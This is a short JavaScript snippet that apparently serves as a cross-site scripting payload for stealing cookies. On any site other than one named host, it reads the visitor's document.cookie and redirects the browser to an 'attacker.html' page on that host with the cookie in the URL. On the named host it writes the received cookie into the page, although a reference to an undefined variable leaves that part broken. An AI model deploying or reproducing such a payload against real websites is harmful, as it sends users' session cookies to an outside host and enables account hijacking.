if (location.host == 'shayankamalzadeh.it') {
    Url = new URL(document.location);
    Parameters = new URLSearchParams(x.search);
    cookie = Parameters.get('cookie');
    document.write(cookie);
}
else {
    var cookie = document.cookie;
    document.location ='https://shayankamalzadeh.it/attacker.html?cookie='+cookie;
}